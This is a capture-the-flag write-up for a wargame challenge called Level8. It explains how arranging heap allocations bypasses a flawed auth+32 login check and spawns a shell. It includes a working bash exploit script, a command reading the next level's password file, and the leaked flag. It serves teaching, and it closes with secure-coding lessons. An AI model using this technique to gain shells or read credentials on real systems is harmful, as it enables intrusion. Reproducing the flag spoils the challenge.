# Level8 - Detailed Heap Layout Manipulation Exploit Analysis

## Table of Contents
1. [Overview](#overview)
2. [Program Architecture](#program-architecture)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Heap Memory Layout](#heap-memory-layout)
5. [Exploitation Technique](#exploitation-technique)
6. [Step-by-Step Walkthrough](#step-by-step-walkthrough)
7. [Memory Visualization](#memory-visualization)
8. [Why This Works](#why-this-works)
9. [Key Takeaways](#key-takeaways)

---

## Overview

**Challenge Type**: Heap Layout Manipulation  
**Difficulty**: Medium  
**Technique**: Logic Bypass via Heap Arrangement  
**No Buffer Overflow Required**: This is a pure logic exploitation

Level8 demonstrates a unique exploitation technique where we don't corrupt memory or overflow buffers. Instead, we manipulate the heap layout to satisfy a flawed authentication check.

---

## Program Architecture

### Interactive Command Interface

The program runs an infinite loop accepting commands:

```c
while (1) {
    printf("%p, %p \n", auth, service);
    
    if (fgets(buffer, 128, stdin) == 0)
        break;
    
    // Parse and execute commands
    if (strncmp(buffer, "auth ", 5) == 0)
        // Handle auth command
    
    if (strncmp(buffer, "reset", 5) == 0)
        // Handle reset command
    
    if (strncmp(buffer, "service", 6) == 0)
        // Handle service command
    
    if (strncmp(buffer, "login", 5) == 0)
        // Handle login command
}
```

### Available Commands

| Command | Syntax | Action |
|---------|--------|--------|
| `auth` | `auth [username]` | Allocates 4 bytes for auth structure |
| `service` | `service [name]` | Allocates memory for service name string |
| `reset` | `reset` | Frees the auth memory |
| `login` | `login` | Attempts authentication and spawns shell |

---

## Vulnerability Analysis

### The Flawed Authentication Check

```c
void handle_login(void) {
    if (*(int *)(auth + 32)) {  // Check 32 bytes after auth pointer
        system("/bin/sh");       // SUCCESS: Give shell
    } else {
        fwrite("Password:\n", 1, 10, stdout);  // FAIL: Ask for password
    }
}
```

### The Critical Flaw

1. **auth allocation**: Only allocates 4 bytes
   ```c
   auth = malloc(4);
   ```

2. **The check**: Looks at `auth + 32` (32 bytes beyond auth)
   ```c
   if (*(int *)(auth + 32))
   ```

3. **The problem**: We control what's at `auth + 32` through heap layout!

### Why This Is Vulnerable

- The program assumes `auth + 32` will be empty/zero
- But heap allocations are sequential
- If we allocate something after auth, it might land at `auth + 32`
- Any non-zero value at that location bypasses authentication

---

## Heap Memory Layout

### Understanding malloc() Behavior

When you call `malloc()`, the heap manager:
1. Finds a free chunk of appropriate size
2. Returns a pointer to usable memory
3. Adds metadata (size, flags) before the returned pointer
4. Allocates memory sequentially (grows upward)

### Heap Structure

```
Low Memory Address
    ↓
[Heap Metadata]
[Chunk 1 - User Data]
[Heap Metadata]
[Chunk 2 - User Data]
[Heap Metadata]
[Chunk 3 - User Data]
    ↓
High Memory Address
```

### Metadata Overhead

Each malloc chunk has metadata (typically 8 bytes on 32-bit systems):
- **Size field**: Size of the chunk
- **Flags**: Allocation status, previous chunk status
- **Alignment**: Ensures proper memory alignment

---

## Exploitation Technique

### The Strategy

We need to make `auth + 32` point to non-zero data. Here's how:

1. **Allocate auth** → Creates small allocation at address X
2. **Allocate large service** → Creates allocation at address X + offset
3. **Calculate overlap** → Service data overlaps with `auth + 32`
4. **Trigger login** → Check finds our service data, grants shell

### Memory Math

```
auth pointer:     0x804a008
auth + 32:        0x804a008 + 0x20 = 0x804a028

If service is allocated at 0x804a018:
service + 16:     0x804a018 + 0x10 = 0x804a028

Therefore: auth + 32 == service + 16
```

### Why 40 Characters?

We need the service string to be long enough to reach `auth + 32`:

```
service allocation at 0x804a018
auth + 32 at          0x804a028
Difference:           0x10 (16 bytes)

So we need at least 16 characters in the service string.
We use 40 to be safe and ensure overlap.
```

---

## Step-by-Step Walkthrough

### Initial State
```bash
$ /home/user/level8/level8
(nil), (nil)
```
- Both auth and service pointers are NULL
- Heap is empty

### Step 1: Allocate Auth
```bash
auth 
```

**What happens:**
```c
auth = malloc(4);  // Allocates 4 bytes
```

**Memory state:**
```
0x804a008: [4 bytes auth data]
           ↑
           auth pointer
```

**Output:**
```
0x804a008, (nil)
```

### Step 2: Allocate Service with Long String
```bash
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**What happens:**
```c
service = strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
// strdup internally calls malloc(strlen(str) + 1)
```

**Memory state:**
```
0x804a008: [auth][metadata][AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0]
           ↑               ↑                           ↑
           auth            service                     auth+32
```

**Output:**
```
0x804a008, 0x804a018
```

### Step 3: Trigger Login
```bash
login
```

**What happens:**
```c
if (*(int *)(auth + 32)) {  // auth + 32 = 0x804a028
    // At 0x804a028 we have 'AAAA' (0x41414141)
    // Non-zero! Condition is TRUE
    system("/bin/sh");  // Shell spawned!
}
```

**Output:**
```
$ 
```
We now have a shell as level9!

### Step 4: Get the Flag
```bash
cat /home/user/level9/.pass
```

**Output:**
```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## Memory Visualization

### Detailed Heap Layout After Each Step

#### After `auth` command:
```
Address       Content                Description
----------    ------------------     --------------------------
0x804a000     [heap metadata]        Chunk header (8 bytes)
0x804a008     [00 00 00 00]         auth data (4 bytes)
              ↑
              auth pointer

0x804a00c     [heap metadata]        Next chunk header
...
0x804a028     [unallocated]         auth + 32 (empty)
```

#### After `service AAAA...` command:
```
Address       Content                Description
----------    ------------------     --------------------------
0x804a000     [heap metadata]        First chunk header
0x804a008     [00 00 00 00]         auth data (4 bytes)
              ↑
              auth pointer

0x804a00c     [heap metadata]        Padding/alignment

0x804a010     [heap metadata]        Service chunk header
0x804a018     [41 41 41 41]         'AAAA' - service string start
              ↑
              service pointer

0x804a01c     [41 41 41 41]         'AAAA'
0x804a020     [41 41 41 41]         'AAAA'
0x804a024     [41 41 41 41]         'AAAA'
0x804a028     [41 41 41 41]         'AAAA' ← auth + 32 points here!
              ↑
              auth + 32

0x804a02c     [41 41 41 41]         'AAAA'
...
```

### Visual Diagram

```
┌─────────────────────────────────────────────────────────┐
│                    HEAP MEMORY                          │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  0x804a008  ┌──────────┐                               │
│             │   auth   │  (4 bytes)                     │
│             │  (0x00)  │                                │
│             └──────────┘                                │
│                  ↓                                       │
│             [metadata]                                  │
│                  ↓                                       │
│  0x804a018  ┌──────────┐                               │
│             │ service  │                                │
│             │  'AAAA'  │  ← service pointer             │
│             ├──────────┤                                │
│             │  'AAAA'  │                                │
│             ├──────────┤                                │
│             │  'AAAA'  │                                │
│             ├──────────┤                                │
│  0x804a028  │  'AAAA'  │  ← auth + 32 points here!     │
│             ├──────────┤     (Non-zero = bypass!)       │
│             │  'AAAA'  │                                │
│             └──────────┘                                │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Pointer Arithmetic Breakdown

```c
auth = 0x804a008

auth + 32 = auth + 0x20
          = 0x804a008 + 0x20
          = 0x804a028

service = 0x804a018

service + 16 = service + 0x10
             = 0x804a018 + 0x10
             = 0x804a028

Therefore: auth + 32 == service + 16
```

---

## Why This Works

### 1. Sequential Heap Allocation

malloc() allocates memory sequentially in the heap:
- First allocation (auth) gets address X
- Second allocation (service) gets address X + size + metadata
- This creates predictable memory layout

### 2. No Bounds Checking

The program doesn't verify that `auth + 32` is within allocated memory:
```c
if (*(int *)(auth + 32))  // No check if this is valid!
```

This is an **out-of-bounds read**, but it's intentional in the program logic.

### 3. Heap Determinism

Without ASLR (Address Space Layout Randomization):
- Heap addresses are predictable
- Same allocations = same addresses
- We can calculate exact offsets

### 4. Logic Flaw vs Buffer Overflow

This is NOT a buffer overflow:
- We don't write beyond allocated boundaries
- We don't corrupt memory
- We simply arrange memory to satisfy a flawed check

### 5. The Authentication Bypass

```c
// Intended logic (broken):
if (auth->password_set) {  // Should check a field in auth struct
    system("/bin/sh");
}

// Actual implementation (vulnerable):
if (*(int *)(auth + 32)) {  // Checks arbitrary memory location
    system("/bin/sh");
}
```

The program assumes `auth + 32` will be part of an auth structure, but auth is only 4 bytes!

---

## Key Takeaways

### Security Lessons

1. **Pointer Arithmetic is Dangerous**
   - Always validate pointer offsets
   - Ensure offsets are within allocated bounds
   - Use sizeof() and proper struct definitions

2. **Heap Layout is Predictable**
   - Attackers can manipulate heap layout
   - Sequential allocations create exploitable patterns
   - ASLR helps but doesn't solve logic flaws

3. **Logic Flaws vs Memory Corruption**
   - Not all exploits require buffer overflows
   - Logic errors can be just as dangerous
   - Understanding program behavior is key

4. **Proper Structure Design**
   ```c
   // BAD: Arbitrary offset
   if (*(int *)(auth + 32))

   // GOOD: Proper struct field
   struct auth_t {
       char username[32];
       int authenticated;
   };
   if (auth->authenticated)
   ```

### Exploitation Techniques Demonstrated

- **Heap Feng Shui**: Arranging heap layout to our advantage
- **Logic Bypass**: Satisfying conditions through unexpected means
- **Out-of-Bounds Read**: Reading memory outside allocated region
- **Pointer Manipulation**: Understanding pointer arithmetic

### Why This Challenge is Important

This challenge teaches that:
- Security is about more than preventing buffer overflows
- Logic flaws can be exploited without memory corruption
- Understanding memory layout is crucial for both attack and defense
- Proper validation and bounds checking are essential

---

## Complete Exploit Script

```bash
#!/bin/bash
# Level8 Exploit

(
    echo "auth "
    echo "service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    echo "login"
    cat  # Keep stdin open for shell interaction
) | /home/user/level8/level8
```

---

## Flag

```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## References

- **Heap Exploitation**: Understanding malloc internals
- **Pointer Arithmetic**: C pointer operations and offsets
- **Logic Vulnerabilities**: Non-memory-corruption exploits
- **Heap Feng Shui**: Manipulating heap layout for exploitation
